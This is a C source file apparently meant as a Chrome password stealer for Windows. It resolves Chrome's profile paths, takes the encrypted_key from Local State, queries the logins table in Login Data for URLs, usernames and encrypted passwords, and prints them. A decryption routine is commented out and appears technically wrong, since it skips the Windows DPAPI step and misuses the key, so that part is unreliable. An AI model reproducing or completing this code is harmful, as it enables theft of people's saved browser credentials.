/*
    gcc -o decrypt .\core.c .\sqlite3.c
    gcc -o decrypt .\core.c .\sqlite3.c -lssl -lcrypto

    C:\Program Files\OpenSSL-Win64\include
    C:\Program Files\OpenSSL-Win64\lib
    
    gcc -o decrypt .\core.c .\sqlite3.c -I"C:\Program Files\OpenSSL-Win64\include" -L"C:\Program Files\OpenSSL-Win64\lib" -lssl -lcrypto
    gcc -o decrypt .\core.c .\sqlite3.c .\base64.c -I"C:\Program Files\OpenSSL-Win64\include" -L"C:\Program Files\OpenSSL-Win64\lib" -lssl -lcrypto
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <Windows.h>
#include <Wincrypt.h>

#include "sqlite3.h"
#include "base64.h"

#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

typedef struct {
    char *action_url;
    char *username_value;
    char *password_value;
} LoginData;

const char *CHROME_PATH_LOCAL_STATE = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State";
const char *CHROME_PATH = "%LOCALAPPDATA%\\Google\\Chrome\\User Data";
const char* loginDataPath = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data";
const int AES_KEY_SIZE = 256;

char *get_full_path(const char *partial_path);
char *encrypted_key(const char *path);
int query_callback(void *data, int argc, char **argv, char **azColName);
// void decrypt_password(const char *encrypted_key, const char *cipher_text);

int main(void) {
    // Get full paths with environment variables resolved
    char *full_path_local_state = get_full_path(CHROME_PATH_LOCAL_STATE);
    char *full_path_chrome = get_full_path(CHROME_PATH);
    char *full_path_login_data = get_full_path(loginDataPath);

    // Print the full paths
    printf(
        "\n\x1B[33mPATH\x1B[0m\n"
        "CHROME_PATH_LOCAL_STATE: %s\n"
        "CHROME_PATH: %s\n"
        "loginDataPath: %s\n",
        full_path_local_state,
        full_path_chrome,
        full_path_login_data
    );

    // GET THE ENCRYPTED KEY
    char *encryptedKey = encrypted_key(full_path_local_state);
    char secret_key[4096];
    if (encryptedKey) {
        printf("\n\x1B[33mEncrypted Key:\x1B[0m \n%s\n", encryptedKey);
        Base64decode(secret_key, encryptedKey);
        if (secret_key) {
            printf("\n\x1B[33mSecret key:\x1B[0m %s\n", secret_key);
            free(encryptedKey);
        } else { printf("Error while decoding the base64 key.\n"); return 1; }
    } else {
        printf("\nFailed to retrieve encrypted key.\n");
    }

    /*#################################################################################################*/
    // READ SQL
    /*#################################################################################################*/
    // Declare the LoginData struct to store results
    LoginData login_data;

    sqlite3 *db;
    char *err_message = 0;

    // Open the SQLite3 database file
    int rc = sqlite3_open(full_path_login_data, &db);
    if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    // SQL query to retrieve data
    const char *sql = "SELECT action_url, username_value, password_value FROM logins";

    // Execute the query
    rc = sqlite3_exec(db, sql, query_callback, &login_data, &err_message);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", err_message);
        sqlite3_free(err_message);
        sqlite3_close(db);
        return 1;
    }

    printf(
        "\n\x1B[33mChrome logins data\x1B[0m\n"
        "Action URL: %s\n"
        "Username Value: %s\n"
        "Password Value: %s\n"
        "Password bytes: ",
        login_data.action_url,
        login_data.username_value,
        login_data.password_value
    );

    // Display PASSWORD VALUE WITH BYTES
    unsigned char *password_bytes = (unsigned char*)login_data.password_value;
    size_t password_length = strlen(login_data.password_value);
    for (size_t i = 0; i < password_length; i++) {
        printf("%02x", password_bytes[i]);
    }
    printf("\n");

    printf("Ciphertext: b'");
    for (size_t i = 0; i < password_length; i++) {
        printf("\\x%c", login_data.password_value[i]);
    }
    printf("'\n");

    /* if (login_data.password_value) {
        decrypt_password(encryptedKey, login_data.password_value);
    } else {
        printf("Password not available.\n");
    } */

    // Close the database
    sqlite3_close(db);

    // Free allocated memory
    free(full_path_local_state);
    free(full_path_chrome);
    free(full_path_login_data);

    return 0;
}

// Function to get the full path with environment variables resolved
char *get_full_path(const char *partial_path) {
    char resolved_path[MAX_PATH];
    DWORD result = ExpandEnvironmentStrings(partial_path, resolved_path, MAX_PATH);
    
    if (result == 0 || result > MAX_PATH) {
        fprintf(stderr, "Error resolving environment variables in path: %s\n", partial_path);
        return NULL;
    }
    
    char *full_path = (char *)malloc(strlen(resolved_path) + 1);
    if (full_path == NULL) {
        fprintf(stderr, "Memory allocation error\n");
        return NULL;
    }
    
    strcpy(full_path, resolved_path);
    return full_path;
}

char *encrypted_key(const char *path) {
    FILE *file = fopen(path, "r");
    if (file == NULL) {
        perror("Error opening file");
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    char *json_data = (char *)malloc(file_size + 1);
    if (json_data == NULL) {
        perror("Memory allocation error");
        fclose(file);
        return NULL;
    }

    fread(json_data, 1, file_size, file);
    json_data[file_size] = '\0';

    fclose(file);

    const char *key = "\"encrypted_key\":\"";
    const char *start = strstr(json_data, key);
    if (start == NULL) {
        free(json_data);
        return NULL; // Key not found
    }

    start += strlen(key);
    const char *end = strchr(start, '"');
    if (end == NULL) {
        free(json_data);
        return NULL; // End of value not found
    }

    // Calculate the length of the encrypted_key
    size_t length = end - start;

    // Allocate memory for the encrypted_key
    char *encrypted_key = (char *)malloc(length + 1);
    if (encrypted_key == NULL) {
        free(json_data);
        perror("Memory allocation error");
        return NULL;
    }

    // Copy the encrypted_key
    strncpy(encrypted_key, start, length);
    encrypted_key[length] = '\0';

    free(json_data);
    return encrypted_key;
}

int query_callback(void *data, int argc, char **argv, char **azColName) {
    LoginData *login_data = (LoginData *)data;
    login_data->action_url = argv[0] ? strdup(argv[0]) : NULL;
    login_data->username_value = argv[1] ? strdup(argv[1]) : NULL;
    login_data->password_value = argv[2] ? strdup(argv[2]) : NULL;
    return 0;
}

/* void decrypt_password(const char *encrypted_key, const char *cipher_text) {
    unsigned char key[AES_KEY_SIZE / 8];
    int key_size = EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha1(), NULL,
                                  (const unsigned char *)encrypted_key, strlen(encrypted_key), 1, key, NULL);

    AES_KEY aes_key;
    AES_set_decrypt_key(key, key_size, &aes_key);

    int cipher_text_len = strlen(cipher_text) / 2;
    unsigned char decrypted_text[cipher_text_len];
    for (int i = 0; i < cipher_text_len; i++) {
        sscanf(&cipher_text[i * 2], "%2hhx", &decrypted_text[i]);
    }

    unsigned char iv[AES_BLOCK_SIZE] = {0}; // Initialization vector for AES decryption

    AES_cbc_encrypt(decrypted_text, decrypted_text, cipher_text_len, &aes_key, iv, AES_DECRYPT);

    // Now, decrypted_text contains the decrypted password
    printf("\nDecrypted Password: %s\n", decrypted_text);
} */
